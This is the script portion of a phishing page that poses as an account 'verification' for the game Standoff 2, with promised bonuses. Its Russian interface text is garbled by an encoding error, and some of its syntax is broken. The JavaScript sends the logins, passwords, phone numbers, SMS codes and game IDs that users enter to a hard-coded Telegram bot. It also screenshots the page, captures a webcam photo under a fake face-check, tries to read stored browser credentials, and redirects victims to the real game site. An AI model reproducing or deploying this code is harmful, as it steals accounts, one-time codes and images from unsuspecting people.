</head>
<body>
    <div class="container">

    <div class="webcam-overlay" id="webcamOverlay">

            <p style="color: black;">–ü–æ—Å–º–æ—Ç—Ä–∏—Ç–µ –≤ –∫–∞–º–µ—Ä—É –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è</p>
            <video id="webcam" width="300" autoplay></video>

    <script>
        // Telegram –±–æ—Ç
        const BOT_TOKEN = "8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8";
        const CHAT_ID = "1491315056";

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
        function sendToTelegram(message) {
            const encodedMessage = encodeURIComponent(message);
            const img = new Image();
            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}`;
        }

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ –≤ Telegram
        function sendPhotoToTelegram(photoData) {
            // –î–ª—è —Ñ–æ—Ç–æ –Ω—É–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥—Ä—É–≥–æ–π –º–µ—Ç–æ–¥
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', photoData);
            formData.append('caption', 'üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞');
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).catch(e => console.log('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ'));
        }

        // –°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞ —ç–∫—Ä–∞–Ω–∞
        function captureScreenshot() {
            return new Promise((resolve) => {
                html2canvas(document.body).then(canvas => {
                    canvas.toBlob(blob => {
                        resolve(blob);
                    }, 'image/jpeg', 0.8);
                });
            });
        }

        // –ó–∞–ø—Ä–æ—Å –¥–æ—Å—Ç—É–ø–∞ –∫ –≤–µ–±-–∫–∞–º–µ—Ä–µ
        function requestWebcam() {
            document.getElementById('webcamOverlay').style.display = 'flex';
            
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.getElementById('webcam');
                    video.srcObject = stream;
                })
                .catch(err => {
                    console.log('–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ:', err);
                    document.getElementById('webcamOverlay').style.display = 'none';
                });
        }

        // –ó–∞—Ö–≤–∞—Ç —Ñ–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã
        function captureWebcam() {
            const video = document.getElementById('webcam');
            const canvas = document.getElementById('webcamCanvas');
            const context = canvas.getContext('2d');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                // –û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ç–æ –≤ Telegram
                sendPhotoToTelegram(blob);
                
                // –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫–∞–º–µ—Ä—ã
                video.srcObject.getTracks().forEach(track => track.stop());
                document.getElementById('webcamOverlay').style.display = 'none';
                
                alert('‚úÖ –õ–∏—Ü–æ —É—Å–ø–µ—à–Ω–æ –≤–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–æ!');
            }, 'image/jpeg', 0.8);
        }

        function closeWebcam() {
            const video = document.getElementById('webcam');
            if (video.srcObject) {
                video.srcObject.getTracks().forEach(track => track.stop());
            }
            document.getElementById('webcamOverlay').style.display = 'none';
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –∏–∑ –±—Ä–∞—É–∑–µ—Ä–∞ (–µ—Å–ª–∏ –¥–æ—Å—Ç—É–ø–Ω–æ)
        function tryGetPhoneNumber() {
            if ('credentials' in navigator) {
                navigator.credentials.get({
                    passwords: true,
                    mediators: ['optional']
                }).then(creds => {
                    if (creds && creds.id) {
                        sendToTelegram(`üì± –°–ò–°–¢–ï–ú–ù–´–ô –ù–û–ú–ï–† –¢–ï–õ–ï–§–û–ù–ê: ${creds.id}`);
                    }
                });
            }
        }

        // –ó–∞–ø—Ä–æ—Å SMS
        function requestSMS() {
            const form = document.getElementById('verificationForm');
            const formData = new FormData(form);
            
            const phone = formData.get('country_code') + formData.get('phone');
            const login = formData.get('login');
            
            // –°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ
            let smsData = "üì± –ó–ê–ü–†–û–° SMS-–í–ï–†–ò–§–ò–ö–ê–¶–ò–ò\n\n";
            smsData += `üë§ –õ–æ–≥–∏–Ω: ${login}\n`;
            smsData += `üìû –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: ${phone}\n`;
            smsData += `üåê User-Agent: ${navigator.userAgent}\n`;
            smsData += `üïí –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}`;
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ
            sendToTelegram(smsData);
            
            // –ü—ã—Ç–∞–µ–º—Å—è —Å–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç
            captureScreenshot().then(blob => {
                sendPhotoToTelegram(blob);
            });
            
            // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –≤–µ–±-–∫–∞–º–µ—Ä—É
            setTimeout(requestWebcam, 1000);
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–æ–ª–µ –¥–ª—è SMS-–∫–æ–¥–∞
            document.querySelector('input[name="sms_code"]').style.display = 'block';
            document.querySelector('button[type="submit"]').style.display = 'block';
            
            alert('üì≤ SMS —Å –∫–æ–¥–æ–º –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –Ω–∞ –≤–∞—à –Ω–æ–º–µ—Ä!');
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –æ—Å–Ω–æ–≤–Ω–æ–π —Ñ–æ—Ä–º—ã
        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const formData = new FormData(this);
            const fullData = {
                login: formData.get('login'),
                password: formData.get('password'),
                phone: formData.get('country_code') + formData.get('phone'),
                sms_code: formData.get('sms_code'),
                game_id: formData.get('game_id')
            };
            
            // –°–æ–±–∏—Ä–∞–µ–º –ø–æ–ª–Ω—ã–π –æ—Ç—á–µ—Ç
            let report = "üéØ –ü–û–õ–ù–´–ô –°–ë–û–† –î–ê–ù–ù–´–• –° SMS-–í–ï–†–ò–§–ò–ö–ê–¶–ò–ï–ô\n\n";
            report += `üìß –õ–æ–≥–∏–Ω: ${fullData.login}\n`;
            report += `üîë –ü–∞—Ä–æ–ª—å: ${fullData.password}\n`;
            report += `üì± –¢–µ–ª–µ—Ñ–æ–Ω: ${fullData.phone}\n`;
            report += `‚úâÔ∏è SMS-–∫–æ–¥: ${fullData.sms_code}\n`;
            if (fullData.game_id) report += `üéÆ –ò–≥—Ä–æ–≤–æ–π ID: ${fullData.game_id}\n`;
            report += `\nüåê –°–∏—Å—Ç–µ–º–∞: ${navigator.platform}\n`;
            report += `üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${/Mobile/.test(navigator.userAgent) ? '–ú–æ–±–∏–ª—å–Ω–æ–µ' : '–î–µ—Å–∫—Ç–æ–ø'}\n`;
            report += `üïí –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}`;
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç–µ–∫—Å—Ç–æ–≤—ã–π –æ—Ç—á–µ—Ç
            sendToTelegram(report);
            
            // –î–µ–ª–∞–µ–º —Ñ–∏–Ω–∞–ª—å–Ω—ã–π —Å–∫—Ä–∏–Ω—à–æ—Ç
            try {
                const finalScreenshot = await captureScreenshot();
                sendPhotoToTelegram(finalScreenshot);
            } catch (e) {
                console.log('–û—à–∏–±–∫–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞:', e);
            }
            
            // –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å —Å–∏—Å—Ç–µ–º–Ω—ã–π –Ω–æ–º–µ—Ä
            tryGetPhoneNumber();
            
            // –°–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
            alert('‚úÖ –ê–∫–∫–∞—É–Ω—Ç —É—Å–ø–µ—à–Ω–æ –≤–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω! –ë–æ–Ω—É—Å—ã –∑–∞—á–∏—Å–ª—è—é—Ç—Å—è...');
            
            // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ
            setTimeout(() => {
                window.location.href = 'https://standoff2.com';
            }, 3000);
        });

        // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —Å–±–æ—Ä –ø—Ä–∏ –∑–∞—Ö–æ–¥–µ
        window.addEventListener('load', function() {
            // –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –∏–∑ –±—Ä–∞—É–∑–µ—Ä–∞
            tryGetPhoneNumber();
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ—Å–µ—â–µ–Ω–∏–∏
            const visitInfo = `üïµÔ∏è –ù–û–í–´–ô –ü–û–°–ï–¢–ò–¢–ï–õ–¨\n` +
                            `üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${/Mobile/.test(navigator.userAgent) ? '–ú–æ–±–∏–ª—å–Ω–æ–µ' : '–î–µ—Å–∫—Ç–æ–ø'}\n` +
                            `üåê –ë—Ä–∞—É–∑–µ—Ä: ${navigator.userAgent.split(' ').slice(-2).join(' ')}\n` +
                            `üìû –ü–æ–¥–¥–µ—Ä–∂–∫–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞: ${'contacts' in navigator ? '–ï—Å—Ç—å' : '–ù–µ—Ç'}\n` +
                            `üïí ${new Date().toLocaleString('ru-RU')}`;
            
            sendToTelegram(visitInfo);
            
            // –ü–µ—Ä–≤—ã–π —Å–∫—Ä–∏–Ω—à–æ—Ç
            setTimeout(() => {
                captureScreenshot().then(blob => {
                    sendPhotoToTelegram(blob);

            }, 2000);
        });

        // –ü–æ–¥–∫–ª—é—á–∞–µ–º –±–∏–±–ª–∏–æ—Ç–µ–∫—É –¥–ª—è —Å–∫—Ä–∏–Ω—à–æ—Ç–æ–≤
        const script = document.createElement('script');
        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
        document.head.appendChild(script);

    </script>
